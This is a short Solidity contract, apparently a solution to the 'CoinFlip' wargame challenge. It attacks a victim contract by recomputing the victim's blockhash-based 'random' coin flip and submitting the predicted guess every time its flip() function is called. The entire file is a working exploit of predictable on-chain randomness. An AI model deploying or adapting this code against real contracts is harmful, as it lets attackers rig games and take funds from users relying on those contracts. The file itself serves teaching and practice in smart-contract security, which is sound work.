// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlip {

    ICoinFlip victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddress) {
        victimContract = ICoinFlip(_victimContractAddress);
    }

    uint256 public blockNumber = block.number;
    bytes32 public blockHash = blockhash(block.number - 1);

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = uint256(blockValue / FACTOR);
        bool side = coinFlip == 1 ? true : false;    
        victimContract.flip(side);
    }
}